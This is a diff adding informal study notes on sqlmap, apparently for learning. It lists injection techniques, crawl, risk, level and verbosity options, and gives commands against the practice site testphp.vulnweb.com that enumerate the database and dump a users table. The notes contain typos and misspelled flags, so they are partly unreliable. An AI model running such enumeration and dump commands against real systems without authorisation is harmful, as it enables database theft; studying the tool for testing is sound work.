@@ -1,0 +1,133 @@
+
+
+
+	Overview :
+	-----------------------
+
+	1- Techniques				-u
+	2- Crawl				--forms
+	3- Enumeration 				--data
+	4- Batch				--headers
+	5- Risk					--user-agent
+	6- Level				--cookie
+	7- Threads				--flush-session
+	8- Verbosity				--output-dir
+	9- Proxy				--temper
+	10- SQL injection Via Burp-Suite	
+
+
+1- Technique:
++++++++++++++
+
+    - B: Boolean-based blind
+    - E: Error-based
+    - U: Union query-based
+    - S: Stacked queries
+    - T: Time-based blind
+    - Q: Inline quires
+
+2- Crawl: 
+++++++++++
+ 
+	- Depth1: http://www.example.com/news
+	- Depth2: http://www.example.com/news/newest/
+	- Depth3: http://www.example.com/news/newest/terror/
+	- Depth4: http://www.example.com/news/newest/terror/country/
+   
+    --crawl
+
+  Example: $ sqlmap -u http://testphp.vulnweb.com/ --crawl 2    # This 2 mean you sending dept 2- and scan sql injection vulnerability
+ 	   $ sqlmap -u http://testphp.vulnweb.com/ --crawl 2 --batch [batch simply choose default answer]
+
+
+ 	If you want to scan with technique here an example:
+ 	- sqlmap -u http://testphp.vulnweb.com/ --crawl 3 --technique="U" [U' means Union]
+ 
+	If you want to scan a big website: you can use thread option to scan
+	- sqlmap -u http://testphp.vulnweb.com/ --crawl 2 --batch --threads
+
+	
+5- Risk:
+++++++++++++
+	
+	 Risk is checking simple payload and big payload in simple rish 1 not harming your website but other rish 2/3
+         it may try other time-base sql injection and many other.stuff 
+	
+	Ex: sqlmap -u http://testphp.vulnweb.com/ --crawl 2 --batch --risk 1
+
+ 
+6- Level: 
++++++++++++++
+
+	GET /home.html HTTP/1.1
+	Host: developer.mozila.org
+	User-Agent: Mozila/5.0 (Macinthosh; Intel MAC)
+	Accept: text/html, appliaction/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	Accept-Language: en-US,en;q=0.5
+	Cookie:Ansudionaer9oi34978h394tnbcnlksjadnf89ehf87abf
+
+ Example: sqlmap -u http://testphp.vulnweb.com/ --crawl 2 --batch --level 1
+
+ 
+
+
+8- Verbosity:
+++++++++++++++
+	
+	- 0: Show only Python traceback,error and critical messages.
+	- 1: Show also information and warning messages.
+	- 2: Show also debug messages.
+	- 3: SHow also payload injected.
+	- 4: Show also HTTP requests.
+	- 5: Show also HTTP responses' headers.
+	- 6: Show also HTTP responses' page content.
+
+   Verbosity simply scan according to this number if choose 1 - it's only show you information and warning massages.
+ 
+   Example> sqlmap -u http://testphp.vulnweb.com/ --crawl 2 --batch -v 4 [to see your request]
+
+
+
+3- User Enumeration: 
++++++++++++++++++++++++++
+
+`	If you got any Vulnerable URL parameter : then how could you exploit- So User Enumeration help you/
+
+	sqlmap -u http://testphp.vulnweb.com/listenproducts.php?cat=1 --current-user --current-db --hostname --batch
+
+	You will get the current username and database name and hostname: 
+	
+	After you got database name you can find the table in database; 
+	sqlmap -u http://testphp.vulnweb.com/listenproducts.php?cat=1 -D [database_name] acurate --tables
+
+	Now you get the Database tables: In this table 'a table name found which named users' [intreseting] Let's check
+	sqlmap -u http://testphp.vulnweb.com/listenproducts.php?cat=1 -D acurate -T users --dump [dump is basically gather all data from this user table]
+
+ 	to get user in columns: sqlmap -u http://testphp.vulnweb.com/listenproducts.php?cat=1 -D acurate -T users --columns
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
